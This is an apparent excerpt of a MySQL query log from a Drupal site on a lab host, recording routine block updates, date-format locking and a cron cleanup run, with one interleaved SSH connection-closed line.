+		    6 Query	UPDATE block SET module='node', delta='syndicate', theme='bartik', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '14')
+		    6 Query	UPDATE block SET module='node', delta='recent', theme='bartik', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='1'
+WHERE  (bid = '15')
+		    6 Query	UPDATE block SET module='search', delta='form', theme='bartik', status='1', weight='-1', region='sidebar_first', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '2')
+		    6 Query	UPDATE block SET module='shortcut', delta='shortcuts', theme='bartik', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '16')
+		    6 Query	UPDATE block SET module='system', delta='main', theme='bartik', status='1', weight='0', region='content', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '1')
+		    6 Query	UPDATE block SET module='system', delta='powered-by', theme='bartik', status='1', weight='10', region='footer', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '6')
+		    6 Query	UPDATE block SET module='system', delta='help', theme='bartik', status='1', weight='0', region='help', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '7')
+		    6 Query	UPDATE block SET module='system', delta='navigation', theme='bartik', status='1', weight='0', region='sidebar_first', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '5')
+		    6 Query	UPDATE block SET module='system', delta='management', theme='bartik', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '17')
+		    6 Query	UPDATE block SET module='system', delta='user-menu', theme='bartik', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '18')
+		    6 Query	UPDATE block SET module='system', delta='main-menu', theme='bartik', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '19')
+		    6 Query	UPDATE block SET module='user', delta='login', theme='bartik', status='1', weight='0', region='sidebar_first', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '4')
+		    6 Query	UPDATE block SET module='user', delta='new', theme='bartik', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='1'
+WHERE  (bid = '20')
+		    6 Query	UPDATE block SET module='user', delta='online', theme='bartik', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '21')
+		    6 Query	SELECT bid, info FROM block_custom ORDER BY info
+		    6 Query	SELECT b.*
+FROM 
+block b
+WHERE (( (module = 'comment') AND (delta = 'recent') )OR( (module = 'node') AND (delta = 'syndicate') )OR( (module = 'node') AND (delta = 'recent') )OR( (module = 'search') AND (delta = 'form') )OR( (module = 'shortcut') AND (delta = 'shortcuts') )OR( (module = 'system') AND (delta = 'main') )OR( (module = 'system') AND (delta = 'powered-by') )OR( (module = 'system') AND (delta = 'help') )OR( (module = 'system') AND (delta = 'navigation') )OR( (module = 'system') AND (delta = 'management') )OR( (module = 'system') AND (delta = 'user-menu') )OR( (module = 'system') AND (delta = 'main-menu') )OR( (module = 'user') AND (delta = 'login') )OR( (module = 'user') AND (delta = 'new') )OR( (module = 'user') AND (delta = 'online') ))AND (theme = 'seven')
+		    6 Query	UPDATE block SET module='comment', delta='recent', theme='seven', status='1', weight='0', region='dashboard_inactive', custom='0', visibility='0', pages='', title='', cache='1'
+WHERE  (bid = '22')
+		    6 Query	UPDATE block SET module='node', delta='syndicate', theme='seven', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '23')
+		    6 Query	UPDATE block SET module='node', delta='recent', theme='seven', status='1', weight='10', region='dashboard_main', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '3')
+		    6 Query	UPDATE block SET module='search', delta='form', theme='seven', status='1', weight='-10', region='dashboard_sidebar', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '12')
+		    6 Query	UPDATE block SET module='shortcut', delta='shortcuts', theme='seven', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '24')
+		    6 Query	UPDATE block SET module='system', delta='main', theme='seven', status='1', weight='0', region='content', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '8')
+		    6 Query	UPDATE block SET module='system', delta='powered-by', theme='seven', status='0', weight='10', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '25')
+		    6 Query	UPDATE block SET module='system', delta='help', theme='seven', status='1', weight='0', region='help', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '9')
+		    6 Query	UPDATE block SET module='system', delta='navigation', theme='seven', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '26')
+		    6 Query	UPDATE block SET module='system', delta='management', theme='seven', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '27')
+		    6 Query	UPDATE block SET module='system', delta='user-menu', theme='seven', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '28')
+		    6 Query	UPDATE block SET module='system', delta='main-menu', theme='seven', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '29')
+		    6 Query	UPDATE block SET module='user', delta='login', theme='seven', status='1', weight='10', region='content', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '10')
+		    6 Query	UPDATE block SET module='user', delta='new', theme='seven', status='1', weight='0', region='dashboard_sidebar', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '11')
+		    6 Query	UPDATE block SET module='user', delta='online', theme='seven', status='1', weight='0', region='dashboard_inactive', custom='0', visibility='0', pages='', title='', cache='-1'
+WHERE  (bid = '30')
+		    6 Query	SELECT dft.type, dft.title, dft.locked FROM date_format_type dft ORDER BY dft.title
+		    6 Query	UPDATE date_format_type SET title='Long', locked='1'
+WHERE  (type = 'long')
+		    6 Query	UPDATE date_format_type SET title='Medium', locked='1'
+WHERE  (type = 'medium')
+		    6 Query	UPDATE date_format_type SET title='Short', locked='1'
+WHERE  (type = 'short')
+		    6 Query	SELECT df.dfid, df.format, df.type, df.locked, dfl.language FROM date_formats df LEFT JOIN date_format_type dft ON df.type = dft.type LEFT JOIN date_format_locale dfl ON df.format = dfl.format AND df.type = dfl.type ORDER BY df.type, df.format
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'Y-m-d H:i') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'm/d/Y - H:i') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'd/m/Y - H:i') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'Y/m/d - H:i') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'd.m.Y - H:i') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'm/d/Y - g:ia') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'd/m/Y - g:ia') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'Y/m/d - g:ia') AND (type = 'short')
+Aug 20 12:34:36 metasploitable3-ub1404 sshd[4214]: Connection closed by 172.28.128.10 [preauth]
+260820 12:34:36	    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'M j Y - H:i') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'j M Y - H:i') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'Y M j - H:i') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'M j Y - g:ia') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'j M Y - g:ia') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'Y M j - g:ia') AND (type = 'short')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'D, Y-m-d H:i') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'D, m/d/Y - H:i') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'D, d/m/Y - H:i') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'D, Y/m/d - H:i') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'F j, Y - H:i') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'j F, Y - H:i') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'Y, F j - H:i') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'D, m/d/Y - g:ia') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'D, d/m/Y - g:ia') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'D, Y/m/d - g:ia') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'F j, Y - g:ia') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'j F Y - g:ia') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'Y, F j - g:ia') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'j. F Y - G:i') AND (type = 'medium')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'l, F j, Y - H:i') AND (type = 'long')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'l, j F, Y - H:i') AND (type = 'long')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'l, Y,  F j - H:i') AND (type = 'long')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'l, F j, Y - g:ia') AND (type = 'long')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'l, j F Y - g:ia') AND (type = 'long')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'l, Y,  F j - g:ia') AND (type = 'long')
+		    6 Query	UPDATE date_formats SET locked='1'
+WHERE  (format = 'l, j. F Y - G:i') AND (type = 'long')
+		    6 Query	SELECT format, type, language FROM date_format_locale
+		    6 Query	SELECT dft.type, dft.title, dft.locked FROM date_format_type dft ORDER BY dft.title
+		    6 Query	UPDATE date_format_type SET title='Long', locked='1'
+WHERE  (type = 'long')
+		    6 Query	UPDATE date_format_type SET title='Medium', locked='1'
+WHERE  (type = 'medium')
+		    6 Query	UPDATE date_format_type SET title='Short', locked='1'
+WHERE  (type = 'short')
+		    6 Query	SELECT df.dfid, df.format, df.type, df.locked, dfl.language FROM date_formats df LEFT JOIN date_format_type dft ON df.type = dft.type LEFT JOIN date_format_locale dfl ON df.format = dfl.format AND df.type = dfl.type ORDER BY df.type, df.format
+		    6 Query	DELETE FROM cache_block 
+WHERE  (expire <> '0') AND (expire < '1787228609')
+		    6 Query	DELETE FROM cache_field 
+WHERE  (expire <> '0') AND (expire < '1787228609')
+		    6 Query	DELETE FROM cache_image 
+WHERE  (expire <> '0') AND (expire < '1787228609')
+		    6 Query	DELETE FROM cache 
+WHERE  (expire <> '0') AND (expire < '1787228609')
+		    6 Query	DELETE FROM cache_filter 
+WHERE  (expire <> '0') AND (expire < '1787228609')
+		    6 Query	DELETE FROM cache_page 
+WHERE  (expire <> '0') AND (expire < '1787228609')
+		    6 Query	DELETE FROM cache_form 
+WHERE  (expire <> '0') AND (expire < '1787228609')
+		    6 Query	DELETE FROM cache_menu 
+WHERE  (expire <> '0') AND (expire < '1787228609')
+		    6 Query	DELETE FROM batch 
+WHERE  (timestamp < '1786364609')
+		    6 Query	DELETE FROM queue 
+WHERE  (created < '1786364609') AND (name LIKE 'drupal_batch:%' ESCAPE '\\')
+		    6 Query	UPDATE queue SET expire='0'
+WHERE  (expire < '1787228609')
+		    6 Query	START TRANSACTION
+		    6 Query	SELECT 1 AS expression
+FROM 
+variable variable
+WHERE ( (name = 'cron_last') ) FOR UPDATE
+		    6 Query	UPDATE variable SET value='i:1787228609;'
+WHERE ( (name = 'cron_last') )
+		    6 Query	COMMIT
+		    6 Query	DELETE FROM cache_bootstrap 
+WHERE  (cid = 'variables')
+		    6 Query	INSERT INTO watchdog (uid, type, message, variables, severity, link, location, referer, hostname, timestamp) VALUES ('0', 'cron', 'Cron run completed.', 'a:0:{}', '5', '', 'http://172.28.128.3/drupal/?q=user/login', '', '172.28.128.10', '1787228609')
+		    6 Query	DELETE FROM semaphore 
+WHERE  (name = 'cron') AND (value = '5020287656a86f45ba4cf99.66949151')
+		    6 Query	DELETE FROM semaphore 
+WHERE  (value = '5020287656a86f45ba4cf99.66949151')
+		    6 Query	SELECT t.word AS realword, i.word FROM search_total t LEFT JOIN search_index i ON t.word = i.word WHERE i.word IS NULL
+		    6 Quit	
